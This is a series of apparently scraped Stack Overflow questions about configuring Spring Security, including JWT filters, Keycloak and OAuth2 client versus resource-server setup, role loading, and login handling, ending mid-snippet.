org.springframework.ldap.CommunicationException: simple bind failed: localhost:10636; nested exception is javax.naming.CommunicationException: simple bind failed: localhost:10636 [Root exception is javax.net.ssl.SSLException: Unexpected error: java.security.InvalidAlgorithmParameterException: the trustAnchors parameter must be non-empty]
    at org.springframework.ldap.support.LdapUtils.convertLdapException(LdapUtils.java:108)
    at org.springframework.ldap.core.support.AbstractContextSource.createContext(AbstractContextSource.java:355)
    at org.springframework.ldap.core.support.AbstractContextSource.doGetContext(AbstractContextSource.java:139)
    at org.springframework.ldap.core.support.AbstractContextSource.getReadOnlyContext(AbstractContextSource.java:158)
    at org.springframework.ldap.core.LdapTemplate.search(LdapTemplate.java:357)
    at org.springframework.ldap.core.LdapTemplate.search(LdapTemplate.java:328)
    at org.springframework.ldap.core.LdapTemplate.search(LdapTemplate.java:629)
    at org.springframework.ldap.core.LdapTemplate.search(LdapTemplate.java:570)
.........
Caused by: javax.net.ssl.SSLException: Unexpected error: java.security.InvalidAlgorithmParameterException: the trustAnchors parameter must be non-empty
    at java.base/sun.security.ssl.Alert.createSSLException(Alert.java:129)
    at java.base/sun.security.ssl.TransportContext.fatal(TransportContext.java:321)
    at java.base/sun.security.ssl.TransportContext.fatal(TransportContext.java:264)
    at java.base/sun.security.ssl.TransportContext.fatal(TransportContext.java:259)
    at java.base/sun.security.ssl.SSLSocketImpl.handleException(SSLSocketImpl.java:1314)
    at java.base/sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:408)
    at java.base/sun.security.ssl.SSLSocketImpl.ensureNegotiated(SSLSocketImpl.java:716)
    at java.base/sun.security.ssl.SSLSocketImpl$AppOutputStream.write(SSLSocketImpl.java:970)
    at java.base/java.io.BufferedOutputStream.flushBuffer(BufferedOutputStream.java:81)
    at java.base/java.io.BufferedOutputStream.flush(BufferedOutputStream.java:142)
    at java.naming/com.sun.jndi.ldap.Connection.writeRequest(Connection.java:398)
    at java.naming/com.sun.jndi.ldap.Connection.writeRequest(Connection.java:371)
    at java.naming/com.sun.jndi.ldap.LdapClient.ldapBind(LdapClient.java:359)
    at java.naming/com.sun.jndi.ldap.LdapClient.authenticate(LdapClient.java:214)
    ... 99 more
Caused by: java.lang.RuntimeException: Unexpected error: java.security.InvalidAlgorithmParameterException: the trustAnchors parameter must be non-empty
    at java.base/sun.security.validator.PKIXValidator.&lt;init&gt;(PKIXValidator.java:89)
    at java.base/sun.security.validator.Validator.getInstance(Validator.java:181)
    at java.base/sun.security.ssl.X509TrustManagerImpl.getValidator(X509TrustManagerImpl.java:308)
    at java.base/sun.security.ssl.X509TrustManagerImpl.checkTrustedInit(X509TrustManagerImpl.java:176)
    at java.base/sun.security.ssl.X509TrustManagerImpl.checkTrusted(X509TrustManagerImpl.java:188)
    at java.base/sun.security.ssl.X509TrustManagerImpl.checkServerTrusted(X509TrustManagerImpl.java:129)
    at java.base/sun.security.ssl.CertificateMessage$T12CertificateConsumer.checkServerCerts(CertificateMessage.java:626)
    at java.base/sun.security.ssl.CertificateMessage$T12CertificateConsumer.onCertificate(CertificateMessage.java:461)
    at java.base/sun.security.ssl.CertificateMessage$T12CertificateConsumer.consume(CertificateMessage.java:361)
    at java.base/sun.security.ssl.SSLHandshake.consume(SSLHandshake.java:392)
    at java.base/sun.security.ssl.HandshakeContext.dispatch(HandshakeContext.java:444)
    at java.base/sun.security.ssl.HandshakeContext.dispatch(HandshakeContext.java:421)
    at java.base/sun.security.ssl.TransportContext.dispatch(TransportContext.java:178)
    at java.base/sun.security.ssl.SSLTransport.decode(SSLTransport.java:164)
    at java.base/sun.security.ssl.SSLSocketImpl.decode(SSLSocketImpl.java:1152)
    at java.base/sun.security.ssl.SSLSocketImpl.readHandshakeRecord(SSLSocketImpl.java:1063)
    at java.base/sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:402)
    ... 107 more
Caused by: java.security.InvalidAlgorithmParameterException: the trustAnchors parameter must be non-empty
    at java.base/java.security.cert.PKIXParameters.setTrustAnchors(PKIXParameters.java:200)
    at java.base/java.security.cert.PKIXParameters.&lt;init&gt;(PKIXParameters.java:120)
    at java.base/java.security.cert.PKIXBuilderParameters.&lt;init&gt;(PKIXBuilderParameters.java:104)
    at java.base/sun.security.validator.PKIXValidator.&lt;init&gt;(PKIXValidator.java:86)

</code></pre>
<p>Imported a certificate in java cacertes and giving the path of trust store and password but still trust anchors parameter must be non-empty error.</p>
"
"<p>I have a set up with a Spring Cloud Gateway service that redirect the requests from my frontend apps to my backend services. I want some of those requests to be authenticated, so I have a keycloak server also running. Both services runs inside docker and share a docker network. I have tried to run the Spring cloud gateway outisde the docker network and it works fine, I am able to login using the keycloak form, but once I set up the docker setup, when I try to login with the correct credentials I get this page as result, the IP is my wsl ip, where the docker is running and also used in the configuration as keycloak-host.</p>
<p><a href=""https://i.stack.imgur.com/yH9Be.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/yH9Be.png"" alt=""invalid credentials"" /></a></p>
<p>This is my application.yml configuration:</p>
<pre class=""lang-yaml prettyprint-override""><code>server:
  port: 8080
spring:
  cloud:
    gateway:
      default-filters:
        - DedupeResponseHeader=Access-Control-Allow-Credentials Access-Control-Allow-Origin Access-Control-Request-Headers
        - SaveSession
        - TokenRelay=
      routes:
        - id: resource
          uri: ${postman-mock}
          predicates:
            - Path=/resource

  security:
    oauth2:
      client:
        provider:
          keycloak:
            issuer-uri: ${keycloak-host}/realms/${realm}
            user-name-attribute: preferred_username #here also tried with email
        registration:
          keycloak:
            provider: keycloak
            client-id: ${client-id}
            client-secret: ${client-secret}
            authorization-grant-type: authorization_code
            scope:
              - openid
              - profile
              - email
              - roles
      resourceserver:
        jwt:
          issuer-uri: ${keycloak-host}/realms/${realm}

</code></pre>
<p>In the keycloak configuration I have tried multiple Valid redirect URIs &amp; Valid post logout redirect URIs
but currently both have <code>*</code> set.</p>
<p>Any idea of the possible issue?</p>
"
"<p>I am currently working on a simple project using Java Spring.
And to implement the signup and login features (user authentication and authorization), I have created an authentication and authorization filter using Spring Security and JWT together.</p>
<pre><code>@Service
@RequiredArgsConstructor
public class UserDetailsServiceImpl implements UserDetailsService {

    private final UserRepository userRepository;

    @Override
    public UserDetails loadUserByUsername(String username) throws UsernameNotFoundException {
        User user = userRepository.findByUsername(username)
                .orElseThrow(() -&gt; new UsernameNotFoundException(&quot;Not Found &quot; + username));

        return new UserDetailsImpl(user);
    }
}
</code></pre>
<p>The above code is an implementation of UserDetailsService for implementing Spring Security.</p>
<p>However, I believe that sending queries to the database for user authentication contradicts one of the core characteristics of JWT, which is 'statelessness'. Therefore, I plan to refactor the code to allow the authentication process to occur without going through the UserDetailsService. In other words, my goal is to implement user authentication solely based on the user information contained in the JWT, without sending queries to the database.</p>
<p>Therefore, I have made comprehensive modifications to the code to enable authentication processing without using UserDetailsService. However, when I run the code and send an authentication request, queries are still sent to the database, even though my code does not use UserDetailsService. (It seems that due to the internal logic of Spring Security, it necessarily goes through UserDetailsService.)</p>
<p>Creating a custom filter for authentication and authorization processing without using Spring Security could solve the problem, but I am curious if there is a way to ensure JWT's statelessness while still using Spring Security.</p>
"
"<p>To implement this, I've marked the open endpoints with permitAll, allowing access without authentication. However, when attempting to access the endpoints requiring authentication, even with a valid token, I consistently receive a 403 Forbidden response.</p>
<p><strong>JwtAuthorizationFilter Class</strong></p>
<pre><code>@Component public class JwtAuthorizationFilter extends OncePerRequestFilter {

private final JwtUtil jwtUtil;
private final ObjectMapper mapper;

public JwtAuthorizationFilter(JwtUtil jwtUtil, ObjectMapper mapper) {
    this.jwtUtil = jwtUtil;
    this.mapper = mapper;
}
@Override
protected void doFilterInternal(HttpServletRequest request, HttpServletResponse response, FilterChain filterChain) throws  IOException, ServletException {
    Map&lt;String, Object&gt; errorDetails = new HashMap&lt;&gt;();
    System.out.println(&quot;Filtering internal start&quot;);
    try {
        String accessToken = jwtUtil.resolveToken(request);
        if (accessToken == null ) {
            filterChain.doFilter(request, response);
            return;
        }
        System.out.println(&quot;token : &quot;+accessToken);
        Claims claims = jwtUtil.resolveClaims(request);

        if(claims != null &amp;&amp; jwtUtil.validateClaims(claims)){
            String email = claims.getSubject();
            //List&lt;String&gt; roles = jwtUtil.getRoles(claims);
            //List&lt;SimpleGrantedAuthority&gt; authorities = roles.stream().map(e-&gt; new SimpleGrantedAuthority(e)).toList();
            var authentication =
                    new UsernamePasswordAuthenticationToken(email,&quot;&quot;);
            authentication.setDetails(new WebAuthenticationDetailsSource().buildDetails(request));
            SecurityContextHolder.getContext().setAuthentication(authentication);
            System.out.println(authentication.getDetails());
        }

    }catch (Exception e){
        System.out.println(e.getMessage());
        errorDetails.put(&quot;message&quot;, &quot;Authentication Error&quot;);
        errorDetails.put(&quot;details&quot;,e.getMessage());
        response.setStatus(HttpStatus.FORBIDDEN.value());
        response.setContentType(MediaType.APPLICATION_JSON_VALUE);
        mapper.writeValue(response.getWriter(), errorDetails);
        response.getWriter().flush();

    }
    filterChain.doFilter(request, response);
} }
</code></pre>
<p><strong>securityFilterChain Class</strong></p>
<pre><code>    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
    System.out.println(&quot;SecurityFilterChain&quot;);
    http.csrf(AbstractHttpConfigurer::disable);
    http.cors(corsConfig-&gt;corsConfig.configurationSource(getConfigurationSource()));
    http
            .authorizeHttpRequests(request -&gt; {
                request.requestMatchers(
                        new AntPathRequestMatcher(&quot;/log&quot;)
                ).permitAll()
                .requestMatchers(
                    new AntPathRequestMatcher(&quot;/h2-console/&quot;)
                ).permitAll()
                        .requestMatchers(
                                new AntPathRequestMatcher(&quot;/&quot;)
                        ).authenticated();
            })
            .addFilterBefore(jwtAuthorizationFilter, UsernamePasswordAuthenticationFilter.class);

            http.csrf((csrf) -&gt;
                    csrf.ignoringRequestMatchers(
                            new AntPathRequestMatcher(&quot;/h2-console/**&quot;)
                    ).csrfTokenRepository(
                            CookieCsrfTokenRepository.withHttpOnlyFalse()
                    )
            );
            http.csrf((csrf) -&gt;
                    csrf.ignoringRequestMatchers(
                            new AntPathRequestMatcher(&quot;/log&quot;)
                    ).csrfTokenRepository(
                            CookieCsrfTokenRepository.withHttpOnlyFalse()
                    )
            );
            http.headers((headers) -&gt; headers
                    .frameOptions(
                            HeadersConfigurer.FrameOptionsConfig::disable
                    )
            );
    return http.build();
}
</code></pre>
<p>I would appreciate any help to resolve this, as I've been trying multiple ways already and couldn't find a solution.</p>
<hr />
<p><strong>Latest Update</strong></p>
<p>I added the role <strong>&quot;USER&quot;</strong>. When there's a user role incorporated in the token, then I am able to call the other endpoints that require authentication. At this time the below code is used to check the role.</p>
<pre><code>.requestMatchers(new AntPathRequestMatcher(&quot;/**&quot;)).hasAuthority(&quot;USER&quot;);
</code></pre>
<p>Is it necessary to always incorporate the role along with the token in spring security. Isn't it possible to use the token without incorporating the role within it?</p>
<p>Also if there's any other better solution please share!</p>
"
"<p>I am getting confused by the spring security configuration. For example, I am developing a Spring-boot application. In project <code>resources/application.yml</code>, I can configure it as below to communicate with Keycloak(or any other OAuth2 server):</p>
<pre><code>spring:
  security:
    oauth2:
      client:
        registration:
          spring-app:
            client-id: spring-app
            client-secret: VWsQaq02oUYaWNzb51dKzACrF5QLgTm8
            authorization-grant-type: authorization_code
            scope: openid, profile, roles
            redirect-uri: http://localhost:8080/login/oauth2/code/spring-app
        provider:
          spring-app:
            issuer-uri: http://localhost:8383/realms/foo
</code></pre>
<p>If I shrink above configuration to highlight the key things for my question later:</p>
<pre><code>spring:
  security:
    oauth2:

      client:
        registration:
          spring-app:
            ...
            ...
        provider:
          spring-app:
            issuer-uri: http://localhost:8383/realms/foo
</code></pre>
<p>I am basically configured my project as an OAuth2 <strong>client</strong>, and I also tell who is the OAuth2 server provider (Keycloak in my case, but it can be any other OAuth2 server).</p>
<p><strong>But If I change</strong> the configuration completely to the following one in the same spring-boot project:</p>
<pre><code>spring:
  security:
    oauth2:
     
      resourceserver:
        jwt:
          jwk-set-uri: ${spring.security.oauth2.resourceserver.jwt.issuer-uri}/protocol/openid-connect/certs
          issuer-uri: http://localhost:8383/realms/foo
</code></pre>
<p>As you can see, above configuration is a <code>resourceserver</code>(Resource Server) configuration, which treats my spring-boot application as a <strong>resource server</strong> instead of <strong>client</strong> in the context of OAuth2. The endpoints exposed by my spring-boot controllers are also protected by keycloak with this configuration (which I've tested), <strong>as long as the</strong> <code>issuer-uri</code> is pointing to keycloak uri.</p>
<p>I get very confused on when should I do <strong>client</strong> configuration and when should I do <strong>resource server</strong> configuration for my spring-boot project when using Spring Security?</p>
<p>I see both make sense, because my spring application is indeed an <strong>OAuth2 client</strong> being registered in Keycloak, and also my spring application is indeed a <strong>resource server</strong> which has endpoints exposed that should be protected by OAuth2 flow(s).</p>
<p>Could someone please clarify this for me, when to use which? Thanks in advance!</p>
<hr />
<p>Dependencies in my project to verify things:</p>
<pre><code>dependencies {
    implementation 'org.springframework.boot:spring-boot-starter-web:3.2.3'
    implementation 'org.springframework.boot:spring-boot-starter-security:3.2.3'

    // oauth2 client
    implementation 'org.springframework.boot:spring-boot-starter-oauth2-client:3.2.3'

    // oauth2 resource server
    implementation 'org.springframework.boot:spring-boot-starter-oauth2-resource-server:3.2.3'
    ...
</code></pre>
"
"<p>I am trying to learn the Spring Security part and use a JWT token with Spring using the 'Jwts' library 0.12.5.</p>
<p>I was following a tutorial which presented this way:</p>
<pre><code>private Claims extractAllClaims(String token){
    return Jwts.parser()
            .setSigningKey(getSignInKey())
            .build()
            .parseSignedClaims(token)
            .getBody();

    }

private Key getSignInKey(){
    byte[] keyBytes = Decoders.BASE64.decode(SECRET_KEY);
    return Keys.hmacShaKeyFor(keyBytes);
}
</code></pre>
<p>I saw the fact that 'getBody', 'parseSignedClaims' and 'setSigningKey' were deprecated, and I have tried to adapt to this:</p>
<pre><code>private Claims extractAllClaims(String token){
    return Jwts.parser()
            .setSigningKey(getSignInKey())
            .build()
            .parseSignedClaims(token)
            .getPayload();
}

private Key getSignInKey(){
    byte[] keyBytes = Decoders.BASE64.decode(SECRET_KEY);
    return Keys.hmacShaKeyFor(keyBytes);
}
</code></pre>
<p>But I still use the 'setSigningKey'. I saw some old questions from the stack, but all of them contain deprecated parts. What is a better way to do it?</p>
<p>Thank you for your time!</p>
"
"<p>I have an existing spring boot application(2.1.7), it is using spring security for login and displaying landing page with few tabs based on roles. Now I have to  remove login screen, so the landing page should come and roles validation will use to show each tab.</p>
<p>I tried all possible solution from internet and nothing worked in my cases. And with existing code if I comment or remove form login to disable login page, loadUserByUsername() is not calling and ui is not working due to missing roles. Any input what I am missing here.
Here is how my SecurityConfig, UserServiceImpl  looks like , Is it really possible to remove login mechanism and keep remaining role based authorization as it is ?</p>
<pre><code>@EnableWebSecurity
public class SecurityConfig extends WebSecurityConfigurerAdapter{
    
    @Autowired
    UserServiceImpl userService;
    
    

    
    
    @Override
    protected void configure(HttpSecurity http) throws Exception {
        http
            .headers()
                .addHeaderWriter(new XFrameOptionsHeaderWriter(XFrameOptionsHeaderWriter.XFrameOptionsMode.SAMEORIGIN))
                .and()
            .cors().and()
            .csrf().disable()
            .authorizeRequests()
            .antMatchers(&quot;/url1*&quot;).access(&quot;hasRole('ADMIN')&quot;)
            .antMatchers(&quot;/url2*&quot;).access(&quot;hasRole('X') or hasRole('K')&quot;)
            .antMatchers(&quot;/url3*&quot;).access(&quot;hasRole('Y') or hasRole('L')&quot;)
            .antMatchers(&quot;/url4*&quot;).access(&quot;hasRole('Z') or hasRole('M')&quot;)
                .anyRequest().authenticated()
                .and()
            .formLogin()
                .loginPage(&quot;/login&quot;)
                .permitAll()
                .defaultSuccessUrl(&quot;/landingPage&quot;)
                .failureUrl(&quot;/login?error=true&quot;)
                .usernameParameter(&quot;username&quot;)
                .passwordParameter(&quot;password&quot;);
                    
           
    }
    
    BCryptPasswordEncoder bCryptPasswordEncoder;
        
    @Bean
    public BCryptPasswordEncoder passwordEncoder() {
        return bCryptPasswordEncoder;
    }
    
    
    @Autowired
    public void configureGlobal(AuthenticationManagerBuilder auth) throws Exception {  
        auth.userDetailsService(userService).passwordEncoder(passwordEncoder());     
    }
    
    @Bean
    public AuthenticationManager customAuthenticationManager() throws Exception {
      return authenticationManager();
    }
    
}

@Service
public class UserServiceImpl implements UserDetailsService {

    @Autowired
    UserRepo userRepo;
    
    @Override
     public UserDetails loadUserByUsername(String username) throws UsernameNotFoundException {
        
          
         UserObj userObj = //db call.
         
        
        List&lt;GrantedAuthority&gt; grantListObj = new ArrayList&lt;GrantedAuthority&gt;();
        
            
            GrantedAuthority grantedAuthority = new SimpleGrantedAuthority(&quot;ROLE_ADMIN&quot;);
                grantListObj.add(grantedAuthority);
       
            
        
        UserDetails userDetails = (UserDetails) new org.springframework.security.core.userdetails.User(userObj.getUsername(), userObj.getPassword(), grantListObj);
        return userDetails;
    }
}
</code></pre>
"
"<p>Currently I work with the Spring Security and I try to implement custom Role and User classes, however I encounter an issue. When I login, my User simply has the empty set of roles(size = 0). I can't figure what is wrong, even though I watched a bunch of videos about that.</p>
<p>This is my Role class:</p>
<pre><code>@Data
@Entity
@RequiredArgsConstructor
@NoArgsConstructor
public class Role implements GrantedAuthority {
    @Id
    @GeneratedValue(strategy = GenerationType.AUTO)
    private Long id;

    @NonNull
    private String authority;

    @ManyToMany(mappedBy = &quot;roles&quot;, fetch = FetchType.EAGER, cascade=CascadeType.MERGE)
    private Set&lt;AppUser&gt; appUsers;

    @Override
    public @NonNull String getAuthority() {
        return authority;
    }
}
</code></pre>
<p>This is my AppUser class:</p>
<pre><code>@Entity
@Data
@AllArgsConstructor
@NoArgsConstructor(access = AccessLevel.PUBLIC, force = true)
@RequiredArgsConstructor
public class AppUser implements UserDetails {
    @Id
    @GeneratedValue(strategy = GenerationType.AUTO)
    private Long id;

    @NonNull
    @Column(unique=true)
    private final String username;

    @NonNull
    private final String password;

    @ManyToMany(fetch = FetchType.EAGER, cascade=CascadeType.MERGE)
    @NonNull
    @JoinTable(
            name = &quot;users_roles&quot;,
            joinColumns = @JoinColumn(
                    name = &quot;user_id&quot;, referencedColumnName = &quot;id&quot;),
            inverseJoinColumns = @JoinColumn(
                    name = &quot;role_id&quot;, referencedColumnName = &quot;id&quot;
            ))
    private Set&lt;Role&gt; roles;
//    private final String fullName;
//    private final String city;
//    private final String phoneNumber;

    @Override
    public Collection&lt;? extends GrantedAuthority&gt; getAuthorities() {
        Set&lt;SimpleGrantedAuthority&gt; simpleGrantedAuthorities = new HashSet&lt;&gt;();
        for (Role role : roles)
            simpleGrantedAuthorities.add(new SimpleGrantedAuthority(&quot;ROLE_&quot; + role.getAuthority()));
        return simpleGrantedAuthorities;
//        return roles.stream()
//                .map(role -&gt; new SimpleGrantedAuthority(&quot;ROLE_&quot; + role.getAuthority()))
//                .collect(Collectors.toSet());
    }

    @Override
    public boolean isAccountNonExpired() {
        return true;
    }

    @Override
    public boolean isAccountNonLocked() {
        return true;
    }

    @Override
    public boolean isCredentialsNonExpired() {
        return true;
    }

    @Override
    public boolean isEnabled() {
        return true;
    }
}
</code></pre>
<p>And here are repositories:</p>
<pre><code>@Repository
public interface RoleRepository extends CrudRepository&lt;Role, Long&gt; {
    Role findByAuthority(String authority);

    Set&lt;Role&gt; findByAppUsers(AppUser appUser);
}

@Repository
public interface UserRepository extends CrudRepository&lt;AppUser, Long&gt; {
    AppUser findByUsername(String username);

    @Query(&quot;SELECT role FROM AppUser u JOIN u.roles role WHERE u.username like :username&quot;)
    Set&lt;Role&gt; findRolesByUsername(@Param(&quot;username&quot;) String username);
}
</code></pre>
<p>And I don't know, maybe I don't properly save my user, but I will leave it here:</p>
<pre><code>    @Bean
    public CommandLineRunner run(RoleRepository roleRepository, UserRepository userRepository, PasswordEncoder passwordEncoder) {
        return args -&gt; {
            if (roleRepository.findByAuthority(&quot;ADMIN&quot;) == null) {
                Role adminRole = roleRepository.save(new Role(&quot;ADMIN&quot;));
                roleRepository.save(new Role(&quot;USER&quot;));

                userRepository.save(new AppUser(&quot;admin&quot;, passwordEncoder.encode(&quot;admin&quot;), new HashSet&lt;&gt;() {
                    {
                        add(adminRole);
                    }
                }));
            }
        };
    }
</code></pre>
"
"<p>I am having trouble understanding SpringSecurity.
I wrote a simple configuration in which there is such a bean:</p>
<pre><code>@Bean
public SecurityFilterChain filterChain(HttpSecurity http) throws Exception{
    http.csrf(CsrfConfigurer::disable)
            .authorizeHttpRequests(auth -&gt; auth
                    .requestMatchers(&quot;/home&quot;).authenticated()
                    .anyRequest().permitAll())
            .authenticationProvider(authenticationProvider())
            .formLogin(login -&gt; login
                    .loginPage(&quot;/login&quot;)
                    .permitAll()
            );
    return http.build();
}
</code></pre>
<p>I wrote a controller that should provide authentication:</p>
<pre><code>@Controller
@RequiredArgsConstructor
public class AuthController {
    @Autowired
    private final SecurityService securityService;
    @GetMapping(&quot;/login&quot;)
    public String getLoginPage(){
        return &quot;login.html&quot;;
    }
    @PostMapping(&quot;/login&quot;)
    @ResponseBody
    public ResponseEntity&lt;AuthResponse&gt; auth(@RequestParam String username, @RequestParam String password){
        LoginRequest loginRequest = new LoginRequest(username, password);
        AuthResponse authResponse = securityService.authenticateUser(loginRequest);
        return ResponseEntity.ok(authResponse);
    }
}
</code></pre>
<p>I wrote a controller that should return a page accessible only to authenticated users:</p>
<pre><code>@Controller
public class MainPageController {
    @GetMapping(&quot;/home&quot;)
    public String getMainPage(){
        return &quot;index.html&quot;;
    }
}
</code></pre>
<p>For testing purposes, I wrote an HTML page from which the POST/login method should be invoked:</p>
<pre><code>&lt;!DOCTYPE html&gt;
&lt;html lang=&quot;ru&quot;&gt;
&lt;head&gt;
  &lt;title&gt;Authorization&lt;/title&gt;
  &lt;meta charset=&quot;utf-8&quot;&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;h2&gt;Authorization&lt;/h2&gt;
&lt;form action=&quot;/login&quot; method=&quot;post&quot;&gt;
  &lt;label for=&quot;username&quot;&gt;Username:&lt;/label&gt;
  &lt;input type=&quot;text&quot; id=&quot;username&quot; name=&quot;username&quot; required&gt;&lt;br&gt;&lt;br&gt;
  &lt;label for=&quot;password&quot;&gt;Password:&lt;/label&gt;
  &lt;input type=&quot;text&quot; id=&quot;password&quot; name=&quot;password&quot; required&gt;&lt;br&gt;&lt;br&gt;
  &lt;button type=&quot;submit&quot;&gt;Log In&lt;/button&gt;
&lt;/form&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p>In my concept, upon successful authentication, an object of the following class should be returned:</p>
<pre><code>@NoArgsConstructor
@AllArgsConstructor
@Builder
public class AuthResponse {
    private String email;
    private String token;
    private String firstName;
    private String lastName;
    private String patronymic;
    private List&lt;String&gt; roles;
}

</code></pre>
<p>Instead, currently, upon successful authentication, I see in the browser Network tab that the POST/login method returns a status of 302 Found and Type document/Redirect, after which it redirects me to the /home page.
When I call this method through Postman, I also receive an HTML response for the /home page. What could be the reason for this, and how can I properly configure the settings to receive a JSON response with user data, including a JWT token, for further passing in the header?</p>
<p>In my concept, upon successful authentication, an JSON-object, but instead, currently, upon successful authentication, I see in the browser Network tab that the POST/login method returns a status of 302 Found and Type document/Redirect, after which it redirects me to the /home page.
When I call this method through Postman, I also receive an HTML response for the /home page.</p>
"
"<p>I upgraded the Spring Security version to 6.2 and set the security settings as follows.</p>
<pre><code>@Bean
public WebSecurityCustomizer webSecurityCustomizer() {
    return (web) -&gt; web.ignoring().requestMatchers(
                    &quot;/h2-console/**&quot;,
                    &quot;/static/**&quot;,
                    &quot;/img/**&quot;,
                    &quot;/css/**&quot;,
                    &quot;/js/**&quot;,
                    &quot;/images/**&quot;,
                    &quot;/favicon.ico&quot;,
                    &quot;/error&quot;,
                    &quot;/**/**.jsp&quot;,
                    &quot;/misc/**&quot;
            )
</code></pre>
<p>And I used an interceptor to record the URL, but before uploading the version, only the URL for the screen was recorded.</p>
<p>After uploading the version</p>
<pre class=""lang-none prettyprint-override""><code>[https|GET][/static/js/placeholders.min.js]
[https|GET][/static/css/admin.css][200](00:00:00.031)
[https|GET][/static/js/jquery-3.7.1.min.js]
</code></pre>
<p>The following static resource URL is also recorded. Are the security settings incorrect, or is the static resource not ignored in the changed version?</p>
<p>CSS is applied by ignoring static resources in the filter, but I am curious why /static request information is displayed in the interceptor.</p>
"
"<p>I'm using spirng boot and security 3.2.3. I registered an interceptor to handle specific path in this way:</p>
<pre class=""lang-java prettyprint-override""><code>@EnableWebMvc
@Configuration
public class WebMvcConfiguration implements WebMvcConfigurer {

    @Autowired
    private JwtTokenAdminInterceptor jwtTokenAdminInterceptor;

    @Override
    public void addInterceptors(InterceptorRegistry registry) {
        log.info(&quot;Start registering custom interceptors...&quot;);
        registry.addInterceptor(jwtTokenAdminInterceptor)
                .addPathPatterns(&quot;/admin/**&quot;)
                .excludePathPatterns(&quot;/admin/employee/login&quot;);
    }
}
</code></pre>
<p>And I configged the spring security in this way:</p>
<pre class=""lang-java prettyprint-override""><code>@Configuration
@EnableWebSecurity
public class SecurityConfig {
    @Bean

    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
                .cors().configurationSource(corsConfigurationSource()).and()
                .authorizeRequests(authorizeRequests -&gt;
                        authorizeRequests
                                .anyRequest().permitAll()
                )
                .csrf().disable();

        return http.build();
    }

    @Bean
    public CorsConfigurationSource corsConfigurationSource() {
        CorsConfiguration configuration = new CorsConfiguration();
        configuration.setAllowedOrigins(Arrays.asList(&quot;*&quot;)); // Allow all origins for development
        configuration.setAllowedMethods(Arrays.asList(&quot;GET&quot;, &quot;POST&quot;, &quot;PUT&quot;, &quot;DELETE&quot;, &quot;OPTIONS&quot;));
        configuration.setAllowedHeaders(Arrays.asList(&quot;authorization&quot;, &quot;content-type&quot;, &quot;x-auth-token&quot;));
        configuration.setExposedHeaders(Arrays.asList(&quot;x-auth-token&quot;));

        UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
        source.registerCorsConfiguration(&quot;/**&quot;, configuration);
        return source;
    }
}
</code></pre>
<p>It's in development so I give access to all source. Currently, I can see the &quot;Start registering custom interceptors...&quot; log when the application is started. But unfortunately, the interceptor, which is the <code>JwtTokenAdminInterceptor</code> never works. The implementation of the interceptor is currently very simple:</p>
<pre class=""lang-java prettyprint-override""><code>@Component
public class JwtTokenAdminInterceptor implements HandlerInterceptor {
    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {

        if (!(handler instanceof HandlerMethod)) {
            return true;
        }

        log.info(&quot;Interceptor is called.&quot;);
        return true;
    }
}
</code></pre>
<p>I see in some tutorials, they <code>@Override</code> the <code>preHandle</code> but mine doesn't allow me to and gives me &quot;Method does not override method from its superclass&quot; error.</p>
<p>Please help, thanks.</p>
"
"<p>I use Spring Security to handle authentication. There I want to log out (logging not log in/out) specific details of specific JWT authentication failures. Those details are either in the request (remote address, endpoint) or in the token itself (custom claims). The failures I want to catch are invalid signature, invalid audience and the default stuff (timestamp and issuer).</p>
<p>What I tried so far:</p>
<ol>
<li>Using an implementation of HandlerInterceptor. The problem with that, if the token is invalid before, the request will not be prehandled here.</li>
<li>I tried to use custom validators <code>oauth2ResourceServer.jwt(this::createCustomJwtValidator)</code> while this works well for all other token claims, I found no way to detect an invalid signature.</li>
<li>then I tried to use an authenticationEntryPoint along with my custom validators as in:</li>
</ol>
<pre><code>  private void oauthCustomizer(OAuth2ResourceServerConfigurer&lt;HttpSecurity&gt; oauth2ResourceServer) {
 oauth2ResourceServer.jwt(this::createCustomJwtValidator).authenticationEntryPoint(logJwtAuthenticationFailure());
  }

  private AuthenticationEntryPoint logJwtAuthenticationFailure() {
    return (request, response, exception) -&gt; {
      if(exception.getMessage().contains(&quot;signature&quot;)) {
        logUnauthorizedAccess(request, exception.getMessage());
      }
      BearerTokenAuthenticationEntryPoint delegate = new BearerTokenAuthenticationEntryPoint();
      delegate.commence(request, response, exception);
    };
  }

</code></pre>
<p>The problem with that: Both my validators and the entryPoint catch and log out the failure, so I get doubled logs, with the difference, that logUnauthorizedAccess has no access to the token claims and I can't log them out. That's why I added the check for &quot;signature&quot; up there to log only Invalid Signature (but it also misses important information, which is no problem).</p>
<p>So what is my goal:</p>
<ol>
<li>Either detect an invalid signature in a validator or decoder.</li>
<li>Or have access to token claims here in the entry point.</li>
</ol>
"
"<p>It's my first time trying to build a role based access control, but I'm facing some problems and would appreciate any kind of help.
I've got a User who's authentication is handled through MSAL in the frontend.
However the roles of a user should be (due to safety reasons) stored only in a database. Is there any kind of way I can load the user from my database and get him into the security context?</p>
<p>I've already looked in some tutorials but they all use the WebSecurityConfigurerAdapter that is no longer in use (as far as I know) and I also created a CustomUserDetailsSerive to load the User from my database, so I just need to find a way to load the User into a Security Context.
In addition what kind of spring security filter chain would you recommend to use in my case?</p>
"
"<p>I am trying to config the Spring Security to use a simple password for some endpoints</p>
<p>I added a environment variable in and added it to application properties</p>
<p><code>spring.security.user.password=${MyApplicationPassword}</code></p>
<p>I want my /admin endpoints to be secured and require this password and the rest to be open. It is a small app and doesn't require some complex security</p>
<p>This is currently my security configuration:</p>
<pre class=""lang-java prettyprint-override""><code>@Configuration
@EnableWebSecurity
public class SecurityConfiguration {

    @Value(&quot;${spring.security.user.password}&quot;)
    private String adminPassword;

    @Bean
    public SecurityFilterChain defaultSecurityFilterChain(HttpSecurity http) throws Exception {
        //&quot;v1&quot; match all my other endpoints beside admin
        http.authorizeHttpRequests(authorize -&gt; authorize.requestMatchers(&quot;/v1/**&quot;).permitAll());

        return http.build();
    }

    @Bean
    public UserDetailsService userDetailsService() {
        UserDetails userDetails = User.withDefaultPasswordEncoder()
            .username(&quot;user&quot;)
            .password(adminPassword)
